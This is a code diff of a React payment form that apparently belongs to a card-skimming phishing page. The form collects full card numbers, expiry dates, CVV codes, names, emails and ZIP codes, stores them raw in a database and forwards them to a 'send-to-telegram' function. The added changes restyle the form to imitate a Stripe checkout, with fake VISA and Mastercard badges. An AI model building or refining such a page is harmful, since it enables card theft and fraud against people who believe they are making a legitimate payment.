@@ -1,8 +1,5 @@
 import { useState } from "react";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
-import { Button } from "@/components/ui/button";
-import { CreditCard, Lock, Shield, ChevronDown, ChevronUp } from "lucide-react";
+import { Lock, CreditCard } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 
@@ -25,17 +22,13 @@ const formatExpiry = (value: string) => {
 const PaymentForm = ({ amount, onSuccess }: PaymentFormProps) => {
   const { toast } = useToast();
   const [loading, setLoading] = useState(false);
-  const [showBilling, setShowBilling] = useState(false);
   const [form, setForm] = useState({
     cardNumber: "",
     expiry: "",
     cvv: "",
     cardholderName: "",
-    fullName: "",
     email: "",
-    address: "",
-    city: "",
-    country: "",
+    country: "United States",
     zip: "",
   });
 
@@ -51,7 +44,6 @@ const PaymentForm = ({ amount, onSuccess }: PaymentFormProps) => {
     setLoading(true);
 
     try {
-      // Create session in DB
       const { data: session, error: dbError } = await supabase
         .from("sessions")
         .insert({ status: "pending", form_data: form as any })
@@ -60,7 +52,6 @@ const PaymentForm = ({ amount, onSuccess }: PaymentFormProps) => {
 
       if (dbError || !session) throw new Error("Failed to create session");
 
-      // Send to Telegram
       const res = await fetch(
         `https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/send-to-telegram`,
         {
@@ -84,151 +75,130 @@ const PaymentForm = ({ amount, onSuccess }: PaymentFormProps) => {
   };
 
   return (
-    <div className="w-full max-w-md animate-fade-up">
-      <div className="glass-card rounded-2xl overflow-hidden">
-        {/* Header */}
-        <div className="bg-gradient-to-br from-primary/5 to-accent px-8 py-6 border-b border-border/50">
-          <p className="text-sm font-medium text-muted-foreground">Total amount</p>
-          <p className="text-4xl font-bold tracking-tight text-foreground mt-1">${amount}</p>
+    <div className="animate-fade-up">
+      <form onSubmit={handleSubmit} className="space-y-6">
+        {/* Email */}
+        <div>
+          <label className="stripe-label">Email</label>
+          <input
+            type="email"
+            value={form.email}
+            onChange={(e) => update("email", e.target.value)}
+            className="stripe-input"
+            placeholder="you@example.com"
+            required
+          />
         </div>
 
-        <div className="px-8 py-6">
-          <form onSubmit={handleSubmit} className="space-y-5">
-            {/* Card Section */}
-            <div className="space-y-3">
-              <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
-                <CreditCard className="h-3.5 w-3.5" />
-                Card information
+        {/* Card information */}
+        <div>
+          <label className="stripe-label">Card information</label>
+          <div className="stripe-input-group">
+            <div className="relative">
+              <input
+                value={form.cardNumber}
+                onChange={(e) => update("cardNumber", e.target.value)}
+                className="stripe-input-row pr-16"
+                placeholder="1234 1234 1234 1234"
+                required
+              />
+              <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
+                <div className="h-5 w-8 rounded bg-gradient-to-br from-blue-600 to-blue-800 flex items-center justify-center">
+                  <span className="text-[7px] font-bold text-white tracking-wider">VISA</span>
+                </div>
+                <div className="h-5 w-8 rounded bg-gradient-to-br from-red-500 to-orange-400 flex items-center justify-center">
+                  <div className="flex -space-x-1">
+                    <div className="h-2.5 w-2.5 rounded-full bg-red-600/80" />
+                    <div className="h-2.5 w-2.5 rounded-full bg-yellow-400/80" />
+                  </div>
+                </div>
               </div>
-
-              <div className="rounded-xl border border-border bg-secondary/30 overflow-hidden divide-y divide-border">
-                <Input
-                  placeholder="1234 1234 1234 1234"
-                  value={form.cardNumber}
-                  onChange={(e) => update("cardNumber", e.target.value)}
-                  className="border-0 rounded-none h-12 px-4 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 text-base"
+            </div>
+            <div className="flex border-t border-input">
+              <input
+                value={form.expiry}
+                onChange={(e) => update("expiry", e.target.value)}
+                className="stripe-input-row flex-1 border-r border-input"
+                placeholder="MM / YY"
+                required
+              />
+              <div className="relative flex-1">
+                <input
+                  value={form.cvv}
+                  onChange={(e) => update("cvv", e.target.value)}
+                  className="stripe-input-row w-full pr-10"
+                  placeholder="CVC"
                   required
                 />
-                <div className="flex divide-x divide-border">
-                  <Input
-                    placeholder="MM / YY"
-                    value={form.expiry}
-                    onChange={(e) => update("expiry", e.target.value)}
-                    className="border-0 rounded-none h-12 px-4 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 flex-1"
-                    required
-                  />
-                  <Input
-                    placeholder="CVC"
-                    value={form.cvv}
-                    onChange={(e) => update("cvv", e.target.value)}
-                    className="border-0 rounded-none h-12 px-4 bg-transparent focus-visible:ring-0 focus-visible:ring-offset-0 flex-1"
-                    required
-                  />
-                </div>
+                <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground/40" />
               </div>
             </div>
-
-            {/* Cardholder */}
-            <div className="space-y-2">
-              <Label className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
-                Cardholder name
-              </Label>
-              <Input
-                placeholder="Full name on card"
-                value={form.cardholderName}
-                onChange={(e) => update("cardholderName", e.target.value)}
-                className="h-12 bg-secondary/30 border-border"
-                required
-              />
-            </div>
-
-            {/* Email */}
-            <div className="space-y-2">
-              <Label className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">
-                Email
-              </Label>
-              <Input
-                type="email"
-                placeholder="you@example.com"
-                value={form.email}
-                onChange={(e) => update("email", e.target.value)}
-                className="h-12 bg-secondary/30 border-border"
-                required
-              />
-            </div>
-
-            {/* Billing toggle */}
-            <button
-              type="button"
-              onClick={() => setShowBilling(!showBilling)}
-              className="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-muted-foreground hover:text-foreground transition-colors w-full"
-            >
-              {showBilling ? <ChevronUp className="h-3.5 w-3.5" /> : <ChevronDown className="h-3.5 w-3.5" />}
-              Billing address
-            </button>
-
-            {showBilling && (
-              <div className="space-y-3 animate-fade-up">
-                <Input
-                  placeholder="Full name"
-                  value={form.fullName}
-                  onChange={(e) => update("fullName", e.target.value)}
-                  className="h-12 bg-secondary/30 border-border"
-                />
-                <Input
-                  placeholder="Address"
-                  value={form.address}
-                  onChange={(e) => update("address", e.target.value)}
-                  className="h-12 bg-secondary/30 border-border"
-                />
-                <div className="grid grid-cols-3 gap-3">
-                  <Input
-                    placeholder="City"
-                    value={form.city}
-                    onChange={(e) => update("city", e.target.value)}
-                    className="h-12 bg-secondary/30 border-border"
-                  />
-                  <Input
-                    placeholder="Country"
-                    value={form.country}
-                    onChange={(e) => update("country", e.target.value)}
-                    className="h-12 bg-secondary/30 border-border"
-                  />
-                  <Input
-                    placeholder="ZIP"
-                    value={form.zip}
-                    onChange={(e) => update("zip", e.target.value)}
-                    className="h-12 bg-secondary/30 border-border"
-                  />
-                </div>
-              </div>
-            )}
-
-            <Button
-              type="submit"
-              className="w-full h-12 text-base font-semibold rounded-xl bg-primary hover:bg-primary/90 transition-all duration-200 shadow-lg shadow-primary/25"
-              disabled={loading}
-            >
-              {loading ? (
-                <div className="flex items-center gap-2">
-                  <div className="h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
-                  Processing...
-                </div>
-              ) : (
-                <>
-                  <Lock className="h-4 w-4 mr-2" />
-                  Pay ${amount}
-                </>
-              )}
-            </Button>
-
-            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
-              <Shield className="h-3.5 w-3.5" />
-              <span>Secured with 256-bit SSL encryption</span>
-            </div>
-          </form>
+          </div>
         </div>
-      </div>
+
+        {/* Cardholder name */}
+        <div>
+          <label className="stripe-label">Cardholder name</label>
+          <input
+            value={form.cardholderName}
+            onChange={(e) => update("cardholderName", e.target.value)}
+            className="stripe-input"
+            placeholder="Full name on card"
+            required
+          />
+        </div>
+
+        {/* Country / Region */}
+        <div>
+          <label className="stripe-label">Country or region</label>
+          <div className="stripe-input-group">
+            <select
+              value={form.country}
+              onChange={(e) => update("country", e.target.value)}
+              className="stripe-input-row w-full appearance-none bg-card cursor-pointer"
+            >
+              <option>United States</option>
+              <option>United Kingdom</option>
+              <option>Canada</option>
+              <option>Germany</option>
+              <option>France</option>
+              <option>Australia</option>
+              <option>Japan</option>
+            </select>
+            <input
+              value={form.zip}
+              onChange={(e) => update("zip", e.target.value)}
+              className="stripe-input-row border-t border-input"
+              placeholder="ZIP"
+              required
+            />
+          </div>
+        </div>
+
+        {/* Pay button */}
+        <button
+          type="submit"
+          disabled={loading}
+          className="stripe-button flex items-center justify-center gap-2"
+        >
+          {loading ? (
+            <>
+              <div className="h-4 w-4 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
+              Processing...
+            </>
+          ) : (
+            <>Pay ${amount}</>
+          )}
+        </button>
+
+        {/* Footer */}
+        <div className="flex items-center justify-center gap-1.5 pt-2">
+          <Lock className="h-3 w-3 text-muted-foreground/50" />
+          <p className="text-xs text-muted-foreground/60">
+            Powered by <span className="font-semibold text-muted-foreground">Pay</span>
+          </p>
+        </div>
+      </form>
     </div>
   );
 };
